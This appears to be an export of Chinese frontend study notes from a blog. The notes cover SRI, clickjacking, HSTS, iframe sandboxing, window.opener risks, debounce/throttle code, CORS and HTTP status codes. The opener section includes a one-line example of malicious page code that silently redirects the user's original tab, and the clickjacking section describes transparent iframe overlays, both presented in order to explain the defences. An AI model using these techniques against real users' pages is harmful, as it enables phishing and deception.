CDN 劫持：CDN 资源存在于第三方服务器，在安全性上并不完全可控。CDN 劫持是一种非常难以定位的问题，首先劫持者会利用某种算法或者随机的方式进行劫持，所以非常难以复现，很多用户出现后刷新页面就不再出现了。 开启 SRI 能有效保证页面引用资源的完整性，避免恶意代码执行。 5.2 SRI 简介 SRI（Subresource Integrity）子资源完整性，指浏览器通过验证资源的完整性（通常从 CDN 获取）来判断其是否被篡改的安全特性。 通过给 link / script 标签添加 integrity 属性可开启 SRI 功能， eg： 123&lt;script type=&quot;text/javascript&quot; src=&quot;//s.url.cn/xxxx/aaa.js&quot; integrity=&quot;sha256-xxx sha384-yyy&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt; integrity 值分成两个部分，第一部分指定哈希值的生成算法（sha256、sha384 及 sha512），第二部分是经过 base64 编码的实际哈希值，两者之间通过一个短横（-）分割。integrity 值可以包含多个由空格分隔的哈希值，只要文件匹配其中任意一个哈希值，就可以通过校验并加载该资源。上述例子中使用了 sha256 和 sha384 两种 hash 方案。 crossorigin=&quot;anonymous&quot; 的作用是引入跨域脚本，在 HTML5 中有一种方式可以获取到跨域脚本的错误信息，首先跨域脚本的服务器必须通过 Access-Controll-Allow-Origin 头信息允许当前域名可以获取错误信息，然后是当前域名的 script 标签也必须声明支持跨域，也就是 crossorigin 属性。link、img 等标签均支持跨域脚本。如果上述两个条件无法满足的话， 可以使用 try catch 方案。 5.3 浏览器处理 SRI 当浏览器在 script 或者 link 标签中遇到 integrity 属性之后，会在执行脚本或者应用样式表之前对比所加载文件的哈希值和期望的哈希值。 当脚本或者样式表的哈希值和期望的不一致时，浏览器必须拒绝执行脚本或者应用样式表，并且必须返回一个网络错误说明获得脚本或样式表失败。 Q：那么当 script 或者 link 资源 SRI 校验失败的时候应该怎么做？ A：通过 script 的 onerror 事件，当遇到 onerror 的时候重新 load 静态文件服务器之间的资源 12345&lt;script type=&quot;text/javascript&quot; src=&quot;//11.url.cn/aaa.js&quot; integrity=&quot;sha256-xxx sha384-yyy&quot; crossorigin=&quot;anonymous&quot; onerror=&quot;loadScriptError.call(this, event)&quot; onsuccess=&quot;loadScriptSuccess&quot;&gt;&lt;/script&gt; Q：如何判断发送 CDN 劫持 A：再请求一次数据，比较两次得到文件的内容（当然不必全部比较），如果内容不一致，就可以得出结论了。 可以只比较前1000字符，CDN 劫持者会在 js 文件最前面注入一些代码来达到他们的目的，注入中间代码需要 AST 解析，成本较高，所以比较全部字符串没有意义。 6. ClickJacking — 点击劫持 6.1 简介 点击劫持 ( ClickJacking ) / UI-覆盖攻击（UI redress attack），是一种视觉上的欺骗手段。 通过覆盖不可见的框架误导受害者点击,虽然受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。这种攻击利用了HTML中标签的透明属性。 一般有两种方式： 攻击者使用一个透明的 iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，此时用户在不知情的情况下点击透明的iframe页面； 攻击者使用一张图片覆盖在网页，遮挡网页原有的位置含义 6.2 原理 攻击者在点击劫持漏洞利用实现过程中使用 iframe 作为目标网页载体。iframe 是 HTML 标准中的一个标签，可以创建包含另外一个页面的内联框架，在点击劫持漏洞利用中主要用来载入目标网页。 6.3 防御 6.3.1 服务器防御 X-FRAME-OPTIONS 机制 微软提出的一个请求头，专门用来防御 iframe 嵌套的点击劫持攻击，其值有： 123DENY // 拒绝任何域加载SAMEORIGIN // 允许同源域下加载ALLOW-FROM // 可以定义允许frame加载的页面地址 使用 FrameBusting 代码 ​ Web安全研究人员针对 iframe 特性提出 Frame Busting 代码，使用 JavaScript 脚本阻止恶意网站载入网页。如果检测到网页被非法网页载入，就执行自动跳转功能。 Frame Busting代码是一种有效防御网站被攻击者恶意载入的方法，网站开发人员使用Frame Busting代码阻止页面被非法载入。需要指出的情况是，如果用户浏览器禁用JavaScript脚本，那么FrameBusting代码也无法正常运行。所以，该类代码只能提供部分保障功能。 具体代码在第八点，iframe 使用认证码认证用户 点击劫持漏洞通过伪造网站界面进行攻击，网站开发人员可以通过认证码识别用户，确定是用户发出的点击命令才执行相应操作。识别用户的方法中最有效的方法是认证码认证。例如，在网站上广泛存在的发帖认证码，要求用户输入图形中的字符，输入某些图形的特征等。 6.3.2 客户端防御 由于点击劫持攻击的代码在客户端执行，因此客户端有很多机制可以防御此漏洞。 升级浏览器 最新版本的浏览器提供很多防御点击劫持漏洞的安全机制，对于普通的互联网用户，经常更新修复浏览器的安全漏洞，能够最有效的防止恶意攻击。 NoScript 扩展 对于Firefox的用户，使用 NoScript 扩展能够在一定程度上检测和阻止点击劫持攻击。利用 NoScript 中 ClearClick 组件能够检测和警告潜在的点击劫持攻击，自动检测页面中可能不安全的页面。 7. HSTS — HTTP严格传输安全 7.1 场景介绍 有很多网站只通过 HTTPS 对外提供服务，但用户在访问某个网站的时候，只输入 baidu.com 或者 www.baidu.com 就会302重定向到 https…。这就存在安全风险，当第一次通过 http 或域名进行访问时，302重定向可能会被劫持，篡改成一个恶意网站。（左边是正常访问流程，右边是被劫持的） 正常流程：浏览器向网站发起一次 HTTP 请求，在得到一个重定向响应后，发起一次 HTTPS 请求并得到最终的响应。在用户眼里：在浏览器直接输入域名可以用 https 协议和网站进行安全通信 被劫持流程：浏览器发起一次明文 HTTP 请求，但实际上会被攻击者拦截，攻击者作为代理，把当前请求转发给恶意网站，恶意网站返回假的网页内容，攻击者把假的网页内容返回给浏览器。 7.2 解决方式 HSTS 解决思路：避免出现一开始有可能会被劫持的 HTTP 的明文请求和重定向。 当用户让浏览器发起 HTTP 请求时，浏览器将其转换为 HTTPS 请求，略和过 HTTP 请求和重定向。 解决方式：用户在浏览器输入网站域名，浏览器得知该域名要使用 HTTPS 进行通信，浏览器直接向网站发起 HTTPS 请求，网站返回相应内容。 7.3 浏览器怎么知道哪个网站应该发 HTTPS 请求？ HSTS（HTTP Strict Transport Security）HTTP严格传输安全，是一个 Web 安全策略机制。 其核心是一个 HTTP 响应头，其可以让浏览器知道，在接下来的一段时间内，当前域名只能通过 HTTPS 进行访问，并且在浏览器发现当前连接不安全的情况下，强制拒绝用户的后续访问要求。 7.3.1 语法 1Strict-Transport-Security: &lt;max-age=&gt;[; includeSubDomains][; preload] max-age是必选参数，是一个以秒为单位的数值，它代表着HSTS Header的过期时间，通常设置为1年，即31536000秒。 includeSubDomains是可选参数，如果包含它，则意味着当前域名及其子域名均开启HSTS保护。 preload是可选参数，只有当你申请将自己的域名加入到浏览器内置列表的时候才需要使用到它。关于浏览器内置列表，下文有详细介绍。 在有效期内，都强制发起 HTTPS 请求 8. iframe 8.1 如何让自己的网站不被其他网站的iframe引用？ 12345// 检测当前网站是否被第三方iframe引用// 若相等证明没有被第三方引用，若不等证明被第三方引用。当发现被引用时强制跳转百度。if(top.location != self.location)&#123; top.location.href = &#x27;http://www.baidu.com&#x27;&#125; 8.2 如何禁用 被使用的 iframe 对当前网站的某些操作？ sandbox 是html5的新属性，主要是提高iframe安全系数。iframe因安全问题而臭名昭著，这主要是因为iframe常被用于嵌入到第三方中，然后执行某些恶意操作。 现在有一场景：我的网站需要 iframe 引用某网站，但是不想被该网站操作DOM、不想加载某些js（广告、弹框等）、当前窗口被强行跳转链接等，我们可以设置 sandbox 属性。如使用多项用空格分隔。 allow-same-origin：允许被视为同源，即可操作父级DOM或cookie等 allow-top-navigation：允许当前iframe的引用网页通过url跳转链接或加载 allow-forms：允许表单提交 allow-scripts：允许执行脚本文件 allow-popups：允许浏览器打开新窗口进行跳转 “”：设置为空时上面所有允许全部禁止 9. opener 如果在项目中需要 打开新标签 进行跳转一般会有两种方式： HTML -&gt; &lt;a target='_blank' href='http://www.baidu.com'&gt; JS -&gt; window.open('http://www.baidu.com') 这两种方式看起来没有问题，但是存在漏洞。 通过这两种方式打开的页面可以使用 window.opener 来访问源页面的 window 对象。 场景：A 页面通过 或 window.open 方式，打开 B 页面。但是 B 页面存在恶意代码如下： window.opener.location.replace('https://www.baidu.com') 【此代码仅针对打开新标签有效】 此时，用户正在浏览新标签页，但是原来网站的标签页已经被导航到了百度页面。恶意网站可以伪造一个足以欺骗用户的页面，使得进行恶意破坏。 即使在跨域状态下 opener 仍可以调用 location.replace 方法 9.1 &lt;a traget='_blank' href=''&gt; 12345678&lt;a target=&quot;_blank&quot; href=&quot;&quot; rel=&quot;noopener noreferrer nofollow&quot;&gt;a标签跳转url&lt;/a&gt;&lt;!-- 通过 rel 属性进行控制： noopener：会将 window.opener 置空，从而源标签页不会进行跳转（存在浏览器兼容问题） noreferrer：兼容老浏览器/火狐。禁用HTTP头部Referer属性（后端方式）。 nofollow：SEO权重优化，详情见 https://blog.csdn.net/qq_33981438/article/details/80909881 --&gt; 9.2 window.open() 1234567&lt;button onclick=&#x27;openurl(&quot;http://www.baidu.com&quot;)&#x27;&gt;click跳转&lt;/button&gt;function openurl(url) &#123; var newTab = window.open(); newTab.opener = null; newTab.location = url;&#125;","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"前端安全","slug":"前端安全","permalink":"https://shylees.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}]},{"title":"滚轮事件","slug":"further/04 滚轮事件","date":"2021-11-12T16:00:00.000Z","updated":"2021-11-12T16:00:00.000Z","comments":false,"path":"furtherNotes/further/04 滚轮事件","link":"furtherNotes/further/04 滚轮事件","permalink":"https://shylees.github.io/furtherNotes/further/04%20%E6%BB%9A%E8%BD%AE%E4%BA%8B%E4%BB%B6","excerpt":"","text":"参考链接： https://developer.mozilla.org/zh-CN/docs/Web/API/WheelEvent https://juejin.cn/post/6974018969690734628 https://blog.csdn.net/TXW6666/article/details/106456045 https://blog.csdn.net/lijingshan34/article/details/88350456 滚轮事件 wheelEvent 1. 介绍滚轮事件 wheelEvent 接口表示用户滚动鼠标滚轮 或 类似输入设备时触发的事件。 **该事件为标准规定的滚轮事件接口。**早期的浏览器实现过MouseWheelEvent和MouseScrollEvent两种滚轮事件接口，但这两种接口皆非标准，加之各浏览器间对其兼容性极差。 onmousewheel（firefox不支持） DOMMouseScroll（只有firefox支持） 因而开发者应使用该标准事件接口取代这两个非标准接口。 不要混淆 wheel 事件和 scroll 事件：wheel 事件的默认动作取决于浏览器实现。 因此 wheel 事件不一定会触发 scroll (en-US) 事件。即便滚轮事件引发了文档内容的滚动行为，也不表示 wheel 事件中的 delta* 值恰好反映文档内容的滚动方向。因此，不要依赖 delta* 属性获知文档内容的滚动方向。可在文档内容滚动事件（scroll）中监视target的scrollLeft和scrollTop的变化以推断滚动方向。 2. wheel 的事件对象的属性 2.1 触发事件 12345(function()&#123; document.addEventListener(&#x27;wheel&#x27;,(e)&#123; console.log(e) &#125;)&#125;)() 2.2 事件对象对比 在谷歌(左)和火狐打印的结果为： 鼠标滚轮事件对象 页面往下( 滚轮往下滚) 页面往上( 滚轮往下滚 ) 触摸板滑动事件对象 页面往下( 触摸板向上滑动 ) 页面往上( 触摸板往下滑动 ) 总结：deltalY：页面向下：&gt; 0 ；页面向上：&lt; 0； ​ wheelDelta | wheelDeltaY：向下 : &lt; 0；向上：&gt;0 123456window.addEventListener(&quot;wheel&quot;, function (e) &#123; let evt = e || window.event; //后面为了兼容 ie evt.preventDefault(); //阻止浏览器默认行为u if (evt.deltaY &gt; 0 || evt.wheelDelta &lt; 0) &#123; ... &#125; else if (evt.deltaY &lt; 0 || evt.wheelDelta &gt; 0) &#123; ... &#125; &#125;,&#123; passive:false &#125;); 3. passive: false !&#123; passive:false &#125;要加上，不然滚轮滚动页面的时候会报：Unable to preventDefault inside passive event listener **原因：**Chorme56+开始为了让页面滚动变得更为流畅，在 window、document 和 body 上注册的 touchstart和 touchmove 事件处理函数，会默认为是 passive: true。 之前：当浏览器首先对默认的事件进行响应的时候，要检查一下是否进行了默认事件的取消。这样就在响应滑动操作之前有那么一丝丝的耽误时间。 现在：google就决定默认取消了对这个事件的检查，默认时间就取消了。直接执行滑动操作。这样就更加的顺滑了。 浏览器忽略默认事件的preventDefault(), 要是手动阻止会弹出一个警告, 告诉你阻止不了!!! 解决： window.addEventListener('touchmove', func, &#123; passive: false &#125;) * &#123; touch-action:none; &#125; touch-action是css中的一个属性，用于设置触摸屏用户如何操纵元素的区域（例如浏览器内置的缩放功能） 4. 项目不足 在项目实现的时候，没办法兼容触摸板滑动，因为触摸板每次滑动的时候会触发多次滚轮事件，就会使得页面从第一个板块滑倒页面底部。 解决方案：节流防抖？ A： 节流，页面会有一点延迟，不太友好 防抖，鼠标滚动事件不会多次触发，还是处理得蛮好的，但是触摸板事件没办法像滚轮事件那样使用，好像并没有阻止到默认事件。","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"节流throttle、防抖debounce","slug":"further/05 节流防抖","date":"2021-11-12T16:00:00.000Z","updated":"2021-11-12T16:00:00.000Z","comments":false,"path":"furtherNotes/further/05 节流防抖","link":"furtherNotes/further/05 节流防抖","permalink":"https://shylees.github.io/furtherNotes/further/05%20%E8%8A%82%E6%B5%81%E9%98%B2%E6%8A%96","excerpt":"","text":"参考链接： https://www.jianshu.com/p/566c66aafa22 https://juejin.cn/post/6959161295358656520 1. 概念 1.1 应用场景 高频触发事件时，可能会频繁执行DOM操作，资源加载等，导致UI停顿甚至浏览器崩溃。 window对象频繁的 onresize，onscroll等事件 拖拽的 mousemove 事件 射击游戏的 mousedown，keydown 事件 文字输入，自动完成的 keyup 事件 1.2 解决方案 对于 window 和 resize 事件，实际需求大多为停止改变大于 n 毫秒后执行后续处理；而其他事件大多数的需求是以一定的频率执行后续处理。 针对这两种需求出现了 debounce 和 throttle 两种方式 1.3 节流 高频事件触发，但在 n 秒内只会执行一次，所以节流会稀释函数的执行频率 比如mouseover，resize这种事件，每当有变化的时候，就会触发一次函数，这样很浪费资源。就比如一个持续流水的水龙头，水龙头开到最大的时候很浪费水资源，将水龙头开得小一点，让他每隔200毫秒流出一滴水，这样能源源不断的流出水而又不浪费。 常见例子：即时查询、不断点击、监听滚动事件触底事件 1.4 防抖 触发高频事件后 n 秒内函数只会执行一次，如果n秒内高频事件再次被触发，则重新计算时间 A和B说话，A一直bbbbbb，当A持续说了一段时间的话后停止讲话，过了10秒之后，我们判定A讲完了，B开始回答A的话；如果10秒内A又继续讲话，那么我们判定A没讲完，B不响应，等A再次停止后，我们再次计算停止的时间，如果超过10秒B响应，如果没有则B不响应。 常见例子：点击按钮、拍照、下拉触底加载下一页等、search 搜索联想、window 触发 resize 1.5 防抖和节流的区别 函数防抖和函数节流都是防止某一时间内频繁触发。 函数防抖是在指定时间只执行一次，而函数节流是每到指定间隔时间执行一次。 函数防抖是将几次操作合并为一次操作进行，函数节流使得一定时间内只触发一次函数。 2. 实现 123456789101112131415161718&lt;body&gt; &lt;div&gt; 无处理输入:&lt;input type=&quot;text&quot; class=&quot;non&quot;&gt;&lt;/div&gt; &lt;div&gt; 立即防抖处理输入:&lt;input type=&quot;text&quot; class=&quot;imdebounce&quot;&gt;&lt;/div&gt; &lt;div&gt; 非立即防抖处理输入:&lt;input type=&quot;text&quot; class=&quot;unimdebounce&quot;&gt;&lt;/div&gt; &lt;div&gt; 整合防抖处理输入:&lt;input type=&quot;text&quot; class=&quot;bothdebounce&quot;&gt;&lt;/div&gt; &lt;div&gt; 时间戳节流处理输入:&lt;input type=&quot;text&quot; class=&quot;stampthrottle&quot;&gt;&lt;/div&gt; &lt;div&gt; 定时器节流处理输入:&lt;input type=&quot;text&quot; class=&quot;timeoutthrottle&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;script&gt; function pri(obj) &#123; console.log(obj.value + &quot; &quot; + new Date()); &#125; const non = document.querySelector(&#x27;.non&#x27;); non.addEventListener(&#x27;keyup&#x27;, e =&gt; &#123; pri(e.target) &#125;) ...&lt;/script&gt; 2.1 节流 使得一定时间内只触发一次函数。原理是通过判断是否有延迟调用函数未执行。 定时器： 函数触发是在时间段内结束的时候 时间戳： 函数触发是在时间段内开始的时候 2.1.1 定时器节流 123456789101112131415161718const timenode = document.querySelector(&#x27;.timeoutthrottle&#x27;); // 定时器 function timethrottle(func, delay) &#123; let canrun; return function (arguments) &#123; if (!canrun) &#123; canrun = setTimeout(() =&gt; &#123; func.call(this, arguments) canrun = null; &#125;, delay) &#125; &#125; &#125; const time = timethrottle(pri, 500); timenode.addEventListener(&#x27;keyup&#x27;, e =&gt; &#123; time(e.target) &#125;) 2.1.2 时间戳节流 1234567891011121314151617const stampnode = document.querySelector(&#x27;.stampthrottle&#x27;);// 时间戳function stampthrottle(func, delay) &#123; let pre = 0; //上一次记录时间 return function (arguments) &#123; let now = new Date(); if (now - pre &gt;= delay) &#123; func.call(this, arguments); //当前时间 - 上次时间 &gt; 延时时间 pre = now; &#125; &#125;&#125;const stamp = stampthrottle(pri, 500);stampnode.addEventListener(&#x27;keyup&#x27;, e =&gt; &#123; stamp(e.target)&#125;) 2.2 防抖 将多次操作合并为一次操作进行。原理是维护一个计时器，规定在delay时间后触发函数，但是在delay时间内再次触发的话，就会取消之前的计时器而重新设置。 **非立即防抖：**指的是触发事件后函数不会立即执行，而是在 n 秒后执行，如果在 n 秒内又触发了事件，则会重新计算函数执行时间。 立即防抖： 指的是触发事件后函数会立即执行，然后 n 秒内不触发事件才能继续执行函数的效果。 简而言之，立即执行版就是第一次事件触发后会立即执行，至少执行一次事件。 2.2.1 立即防抖 123456789101112131415161718192021222324252627const imnode = document.querySelector(&#x27;.imdebounce&#x27;);// 立即防抖// 指的是触发事件后函数会立即执行，n 秒内不触发事件才能继续执行函数的效果function imdebounce(func, delay) &#123; let timeout; return function (arguments) &#123; if (timeout) &#123; clearTimeout(timeout); &#125; let flag = !timeout; timeout = setTimeout(function () &#123; // func.call(this, arguments); timeout = null; &#125;, delay) if (flag) &#123; func.call(this, arguments) &#125; &#125;&#125;const im = imdebounce(pri, 500);imnode.addEventListener(&#x27;keyup&#x27;, e =&gt; &#123; // ; debugger // imdebounce(pri, 500)(e.target) //就不可以为什么 im(e.target);&#125;) 2.2.2 非立即防抖 12345678910111213141516171819const unimnode = document.querySelector(&#x27;.unimdebounce&#x27;);// 非立即防抖// 高频触发时 如果 触发后 delay 没有再触发 就执行函数function unimdebounce(func, delay) &#123; let timeout; return function (arguments) &#123; if (timeout) &#123; clearTimeout(timeout); &#125; timeout = setTimeout(() =&gt; &#123; func.call(this, arguments); timeout = null; &#125;, delay) &#125;&#125;const un = unimdebounce(pri, 500);unimnode.addEventListener(&#x27;keyup&#x27;, e =&gt; &#123; un(e.target)&#125;) 2.2.3 结合版 1234567891011121314151617181920212223242526272829303132const bothnode = document.querySelector(&#x27;.bothdebounce&#x27;);// 结合版function debounce(func, delay = 500, immediate = true) &#123; let timeout; return function (arguments) &#123; if (timeout) &#123; clearTimeout(timeout); &#125; if (immediate) &#123; // 立即执行 let flag = !timeout; timeout = setTimeout(() =&gt; &#123; timeout = null; &#125;, delay) if (flag) &#123; func.call(this, arguments) &#125; &#125; else &#123; // 非立即执行 timeout = setTimeout(() =&gt; &#123; func.call(this, arguments); timeout = null; &#125;, delay) &#125; &#125;&#125;const both = debounce(pri, 500, false);bothnode.addEventListener(&#x27;keyup&#x27;, e =&gt; &#123; both(e.target)&#125;)","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"同源策略","slug":"further/02 同源策略 跨域","date":"2021-11-11T16:00:00.000Z","updated":"2021-11-11T16:00:00.000Z","comments":false,"path":"furtherNotes/further/02 同源策略 跨域","link":"furtherNotes/further/02 同源策略 跨域","permalink":"https://shylees.github.io/furtherNotes/further/02%20%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%20%E8%B7%A8%E5%9F%9F","excerpt":"","text":"ajax 引申内容 0. 为什么会有同源策略 简单来说是为了安全 1.为了防止恶意网页可以获取其他网站的本地数据。 2.为了防止恶意网站iframe其他网站的时候，获取数据。 3.为了防止恶意网站在自已网站有访问其他网站的权利，以免通过cookie免登，拿到数据。 1. 同源策略 指 “协议 + 域名 + 端口” 三者相同 同源策略限制js能力，其限制的内容有： Cookie、LocalStorage、indexedDB 等存储型内容 DOM 节点 AJAX 请求被浏览器拦截 请求能发出去，服务器端能收到请求并正常返回结构，结果被浏览器拦截了 但所有 src 和 href 属性都不受同源策略限制，可以请求第三方服务器数据内容 2. 什么情况会造成跨域 当协议、子域名、主域名、端口号中 3. 解决跨域的方式 3.1 jsonp：只能解决 get 跨域 原理：利用 script 标签的 src 属性不受同源策略限制。 网页可以得到从其他来源动态产生的 JSON 数据，jsonp 请求一定要对方的服务器做支持才可以。 步骤： 创建 script 标签 src 设置 接口 url 接口参数必须要带一个自定义参数名 不然后台无法返回数据 通过定义函数名去接收后台返回数据 3.2 CORS：跨域资源共享 原理：服务器设置 Access-Control-Allow-Origin 响应头后，浏览器会允许跨域请求 限制：浏览器需要支持 html5 ，可以支持 post put 等方法，兼容ie9 以上 后台设置： Access-Control-Allow-Origin：* 允许所有域名访问 Access-Control-Allow-Origin：http://a.com 只允许 a.com 访问 使用这种方式解决跨域问题，会在发送请求时出现两种情况，分别为 简单请求 和 复杂请求 简单请求：使用 GET、HEAD、POST 或者 ​ Content-Type 的值仅限于 text\\plain、multipart/form-data、application/x-www-form-urlencoded 请求中的任意 XMLHttpRequestUpload 对象均没有注册任何事件监听器 可以使用 XMLHttpRequest.upload 属性监听 复杂请求：不符合上述两个要求的请求。复杂请求的 cors 请求，会在正式通信之前，增加一次 http 查询请求，称为“预检”请求，该请求时 option 方法的，通过该请求来知道服务器是否允许跨域请求 3.3 postMessage 是 html5 XMLHttpRequest level2 中的 api，且是为数不多的可以跨域操作的 window 属性之一 可以解决： 页面和其打开的新窗口的数据传递 多窗口之间消息传递 页面与嵌套的iframe消息传递 上面三个场景的跨域数据传递 postMessage() 方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文档、多窗口、跨域消息传递。 otherWindow.postMessage(message, targetOrigin, [transfer]); 3.4 websocket 3.5 node 中间件代理 3.6 nginx 反向代理 3.7 window.name + iframe 3.8 location.hash + iframe 3.9 document.domain + iframe 原理：**相同主域名不同子域名下的页面，给页面设置 document.domain 为基础主域，实现同域 ** (二级域名相同的请求下 a.text.com b.text.com),给页面强制添加 document.domain = ‘text.com’ 表示二级域名都相同就可以实现跨域 限制：同域 document 提供的是页面间的互操作，需要载入 iframe 页面 123456789101112131415161718192021// a.html&lt;body&gt; helloa &lt;iframe src=&quot;http://b.zf1.cn:3000/b.html&quot; frameborder=&quot;0&quot; onload=&quot;load()&quot; id=&quot;frame&quot;&gt;&lt;/iframe&gt; &lt;script&gt; document.domain = &#x27;zf1.cn&#x27; function load() &#123; console.log(frame.contentWindow.a); &#125; &lt;/script&gt;&lt;/body&gt;// b.html&lt;body&gt; hellob &lt;script&gt; document.domain = &#x27;zf1.cn&#x27; var a = 100; &lt;/script&gt;&lt;/body&gt; 6.4 用Apache做转发（逆向代理），让跨域变成同域","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"网络","slug":"网络","permalink":"https://shylees.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"HTTP 常见状态码","slug":"further/02 常见状态码","date":"2021-11-11T16:00:00.000Z","updated":"2021-11-11T16:00:00.000Z","comments":false,"path":"furtherNotes/further/02 常见状态码","link":"furtherNotes/further/02 常见状态码","permalink":"https://shylees.github.io/furtherNotes/further/02%20%E5%B8%B8%E8%A7%81%E7%8A%B6%E6%80%81%E7%A0%81","excerpt":"","text":"ajax 引申 1xx 信息性 — 接收的请求正在处理 2xx 成功 — 请求正常处理完毕 200 OK 204 No Content 请求处理成功，返回的响应报文中 不含也不允许有 实体的主体部分，即无资源返回 206 Partial Content 客户端进行了范围请求，响应报文包含由Content-Range 指定范围的实体内容。 3xx 重定向 — 需要进行附加操作以完成请求 301 Moved Permanently 永久重定向 302 Found 临时重定向 303 See Other 因请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源 于302 功能相同，但明确表示采用 get 获取资源 304 Not Modified 发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况 307 Temporary Redirect 临时重定向 302 禁止 post 换成 get，但实际不遵守；307 会遵守浏览器标准，不会从 post 变成 get 4xx 客户端错误 — 服务器无法处理请求 400 Bad Request 请求报文中存在语法错误 401 Unauthorized 发送的请求需要有通过 HTTP 认证的认证信息。 第二次返回402表示用户认证失败。 403 Forbidden 对请求资源的访问被服务器拒绝了 404 Not Found 服务器无法找到请求的资源 5xx 服务器错误 — 服务器处理请求出错 500 Internal Server Error 服务端在执行请求时发生了错误 503 Service Unavailable 服务器暂时处于超负载或正在进行停机维护，无法处理请求","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"网络","slug":"网络","permalink":"https://shylees.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"视差滚动","slug":"further/03 视差滚动","date":"2021-11-11T16:00:00.000Z","updated":"2021-11-11T16:00:00.000Z","comments":false,"path":"furtherNotes/further/03 视差滚动","link":"furtherNotes/further/03 视差滚动","permalink":"https://shylees.github.io/furtherNotes/further/03%20%E8%A7%86%E5%B7%AE%E6%BB%9A%E5%8A%A8","excerpt":"","text":"1. 简介 视差滚动（Parallax Scrolling）是指让多层背景以不同的速度移动，形成立体的运动效果，带来非常出色的视觉体验。 作为网页设计的热点趋势，越来越多的网站应用了这项技术。 2. css background-attachment background-attachment：决定背景图像的位置是在视口内固定，或者随着包含它的区块滚动 scroll ( 默认 ) : 背景相对于元素本身固定，而不是随着内容滚动 背景铺满 元素盒子可视位置，内容溢出 流动条，拉滚动条，背景不动，只动内容 local：背景相对于元素的内容固定。背景会随着元素内容滚动，并且背景的绘制区域和定位区域是相对于可滚动的区域而不是包含他们的边框。 背景铺满 元素可视 or 流动条隐藏部分，相当于内容与背景的相对位置静止。 fixed：背景相对于视口固定。背景不会随着元素的内容滚动。 视察滚动的实现： 123456.g-img &#123; background-image: url(...); background-attachment: fixed; background-size: cover; background-position: center center;&#125; 3. transform：translate3d 我们给容器设置上 transform-style: preserve-3d 和 perspective: xpx，那么处于这个容器的子元素就将位于3D空间中， 再给子元素设置不同的 transform: translateZ()，这个时候，不同元素在 3D Z轴方向距离屏幕（我们的眼睛）的距离也就不一样 滚动滚动条，由于子元素设置了不同的 transform: translateZ()，那么他们滚动的上下距离 translateY 相对屏幕（我们的眼睛），也是不一样的，这就达到了滚动视差的效果。","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"css","slug":"css","permalink":"https://shylees.github.io/tags/css/"}]},{"title":"展开讲讲红宝书提到的“es中...按值传递”","slug":"further/01 es 中函数的参数都是按值传递的","date":"2021-11-10T16:00:00.000Z","updated":"2021-11-10T16:00:00.000Z","comments":false,"path":"furtherNotes/further/01 es 中函数的参数都是按值传递的","link":"furtherNotes/further/01 es 中函数的参数都是按值传递的","permalink":"https://shylees.github.io/furtherNotes/further/01%20es%20%E4%B8%AD%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E9%83%BD%E6%98%AF%E6%8C%89%E5%80%BC%E4%BC%A0%E9%80%92%E7%9A%84","excerpt":"","text":"第4版红宝书 4.1 提到 ECMAScript 中所有函数的值都是按值传递的 按值传递 原始值 很好理解，就是将值拷贝一份 成为参数，这个参数与外界原来的值，就没有任何联系了 这里展开讲讲引用值 12345678910let person = &#123; age: 18 &#125;function add (per) &#123; per.age++; console.log(per);&#125;add(person); // &#123; age: 19 &#125;console.log(person) // &#123; age: 19 &#125; 这个例子的输出结果显然 就不符合 按值传递，是不是意味着 应该是 按引用传递呢？我们再看一个例子： 12345678910let person = &#123; age: 18&#125;function add(per)&#123; per = 20; console.log(per);&#125;add(person); //20console.log(person); // &#123; age: 18 &#125; 这个例子的输出结果就有点 按值传递 了。 那为什么会有这两种这么迷惑的结果呢？这就引出了第三种值的传递方式：按共享传递。 顺便回顾下我们上面有说到的两种值的传递方式： 按值传递：把值复制给另一个变量 按引用传递：把引用对象传给另一个变量，想到于两个变量指向同一个引用 按共享传递：把对象的引用副本传递给另一个变量 所以，就上面的例子来说，修改 per.age 会直接修改到原值，但直接修改 per 并不会修改原值。 其实拷贝副本也算是一种值的拷贝，所以红宝书直接认为是按值传递也没有说不过去。 总结：若参数为 原始类型 就是 按值传递，若参数为 引用类型 就是 按共享传递","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"ajax","slug":"further/02 ajax","date":"2021-11-10T16:00:00.000Z","updated":"2021-11-10T16:00:00.000Z","comments":false,"path":"furtherNotes/further/02 ajax","link":"furtherNotes/further/02 ajax","permalink":"https://shylees.github.io/furtherNotes/further/02%20ajax","excerpt":"","text":"ajax 1.简介 ajax(asynchronous javascript and xml) 异步 js 与 xml 一种创建交互式网页应用的网页开发技术 使用异步方式与服务器通信，不需要打断用户操作 在不刷新整个网页情况下，与服务器通信交互 2. 特点 优点：可以不刷新页面与服务端进行通信 ​ 允许根据用户事件来更新部分页面内容 缺点：没有浏览记录，不能回退 ​ 存在同源跨域问题 ​ seo不友好 3. 原生ajax使用 创建对象 初始化 